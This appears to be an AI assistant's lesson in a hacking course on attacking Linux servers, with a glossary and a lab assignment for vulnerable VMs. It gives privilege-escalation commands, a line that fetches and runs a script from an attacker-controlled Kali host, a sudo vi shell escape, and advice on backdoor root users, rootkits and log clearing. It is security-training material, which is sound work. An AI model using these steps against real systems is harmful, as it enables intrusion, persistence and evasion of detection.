@@ -1,0 +1,86 @@
+Of course. Let's shift our focus from the Windows world to the other major pillar of enterprise computing: Linux.
+
+Topic 35: Hacking Linux Operating System
+
+Linux powers the vast majority of the world's web servers, cloud infrastructure, and embedded systems. While often perceived as more secure than Windows due to its permission model and open-source nature, it is by no means invulnerable. Hacking a Linux system requires a different set of techniques and a deep understanding of its file system hierarchy, user permissions, and common service misconfigurations.
+
+The philosophy of a Linux attack is similar to Windows: gain access, escalate privileges, and maintain control. However, the path to get there is distinct.
+
+1.  **Gaining Initial Access:**
+    The entry points for a Linux server are typically its network services.
+    - **Exploiting Network Services:** Web servers (Apache, Nginx), file transfer services (FTP, Samba), and remote access services (SSH) are prime targets. An outdated version of a web application framework (like WordPress, Drupal) or a vulnerable service like ProFTPD or vsftpd can provide a direct way to execute code on the server.
+    - **SSH Brute-Force:** Using tools like Hydra to brute-force weak SSH credentials is a very common and often successful attack against internet-facing Linux servers.
+    - **Web Application Vulnerabilities:** SQL Injection or File Inclusion vulnerabilities in a web application can be used to read sensitive files (like `/etc/passwd`) or upload a web shell, which gives you command execution through the web server.
+
+2.  **Establishing a Foothold:**
+    Once you have code execution, you want a stable shell. The initial shell might be limited (e.g., a web shell running as the `www-data` user). The goal is to "upgrade" this to a fully interactive TTY shell, which provides better stability and allows you to run programs like `su` and `sudo`. Techniques for this include using Python, bash, or socat.
+
+3.  **Privilege Escalation:**
+    This is the core of Linux hacking. You are likely inside as a low-privilege user (`www-data`, `nobody`, a regular user). Your goal is to become `root`. The methods are diverse and rely heavily on misconfigurations:
+    - **Kernel Exploits:** Just like Windows, the Linux kernel can have vulnerabilities. Tools like `Linux Exploit Suggester` can help identify if the system is vulnerable to a known kernel exploit (e.g., Dirty Cow).
+    - **SUID/SGID Misconfiguration:** SUID (Set owner User ID) is a special file permission that allows a user to run an executable with the permissions of the file owner. If a program with the SUID bit set is owned by root and is vulnerable (or can be abused), you can use it to escalate privileges. The classic example is finding `sudo` misconfigurations that allow a user to run a specific command as root without a password.
+    - **Sudo Misconfiguration:** If a user is allowed to run certain commands as root via `sudo` (e.g., `sudo vi`), you can often escape to a root shell from within that application.
+    - **World-Writable Files:** If critical files or scripts that are run by root are writable by any user, you can modify them to execute your own code, which will then run with root privileges.
+    - **Cron Job Abuse:** Cron jobs are scheduled tasks that run as a specific user. If a cron job script is writable by your current user, you can modify it to run a malicious command with the higher privileges of the user who owns the cron job (often root).
+    - **Credential Hunting:** Searching for passwords in configuration files, bash history, and memory.
+
+4.  **Post-Exploitation and Persistence:**
+    Once you are root, you can:
+    - **Steal Data:** Access all files on the system.
+    - **Install a Rootkit:** A kernel-level rootkit can hide your presence entirely.
+    - **Add a Backdoor User:** Create a new user with UID 0 (root) or add your SSH key to the root user's `authorized_keys` file to maintain persistent SSH access.
+    - **Cover Tracks:** Clear bash history (`~/.bash_history`) and system logs (like `/var/log/auth.log`).
+
+The key to successful Linux privilege escalation is thorough enumeration. You must meticulously check the system's configuration, looking for any tiny mistake that can be leveraged. Automated scripts like `LinPEAS` (Linux Privilege Escalation Awesome Script) are invaluable as they perform hundreds of these checks automatically.
+
+Glossary for Topic 35:
+
+Linux: An open-source Unix-like operating system kernel, and by extension, the family of operating systems built upon it.
+
+SUID (Set User ID): A special type of file permission given to an executable file, which allows it to run with the privileges of the file's owner, rather than the user who launched it.
+
+Kernel Exploit: An exploit that targets a vulnerability in the core of the operating system (the kernel) to gain elevated privileges.
+
+Cron Job: A time-based job scheduler in Unix-like operating systems that allows users to schedule jobs (commands or scripts) to run periodically at fixed times, dates, or intervals.
+
+TTY Shell: A full, interactive terminal session. Gaining a TTY is often necessary to run certain post-exploitation commands.
+
+LinPEAS: A popular privilege escalation script that searches for possible paths to escalate privileges on a Linux host.
+
+World-Writable: A file or directory permission that allows any user on the system to modify it.
+
+Sudo: A program for Unix-like operating systems that allows users to run programs with the security privileges of another user, by default the superuser (root).
+
+Hands-On Assignment for Topic 35:
+
+Your objective is to practice the Linux privilege escalation methodology on a vulnerable lab machine (like a Metasploitable or Kioptrix VM).
+
+1.  **Gain Initial Access (Simulated or Real):**
+    - In your lab, gain a shell on the Linux target. This could be through a known exploit (e.g., against a vulnerable Samba service) or by using default/weak SSH credentials.
+    - Document how you obtained the initial shell and what user you are (`whoami`).
+
+2.  **Upgrade to a TTY Shell:**
+    - Your initial shell might be limited. Practice upgrading it to a full TTY.
+    - Use the Python one-liner: `python -c 'import pty; pty.spawn("/bin/bash")'`
+    - Document the command you used and confirm you have a better prompt.
+
+3.  **Manual Privilege Escalation Enumeration:**
+    - Perform these basic manual checks and document your findings:
+        - **Check Sudo Permissions:** `sudo -l` What commands can your user run as root?
+        - **Find SUID Files:** `find / -perm -u=s -type f 2>/dev/null` List all SUID files. Are any unusual or known to be vulnerable (e.g., `nmap`, `vim`, `bash`)?
+        - **Check for World-Writable Files:** `find / -perm -o=w -type f 2>/dev/null 2>/dev/null` (Focus on files in `/etc/` or scripts).
+        - **View Cron Jobs:** `cat /etc/crontab` Are there any custom cron jobs? Who owns them?
+
+4.  **Run an Automated Script (LinPEAS):**
+    - Download and run LinPEAS on the target. You can host it on a simple Python HTTP server on your Kali machine and use `wget` or `curl` on the target to fetch it.
+    - On Kali: `python3 -m http.server 80`
+    - On Target: `wget http://[Your_Kali_IP]/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`
+    - Let it run. It will produce a long output. Scan through it for high-risk findings (highlighted in red/yellow). Document one potential privilege escalation vector it identified.
+
+5.  **Privilege Escalation Execution (Conceptual):**
+    - Based on your findings from step 3 or 4, describe the *next command* you would run to attempt to become root.
+    - Example: "LinPEAS found that the `sudo -l` output shows I can run `vi` as root without a password. I would run `sudo vi` and then type `:!bash` inside vi to escape to a root shell."
+
+This assignment emphasizes the methodical process of Linux post-exploitation. The skill lies not in memorizing one exploit, but in knowing how to thoroughly interrogate a system to find its unique weakness.
+
+Are you ready to proceed to Topic 36: Hacking Android O.S?
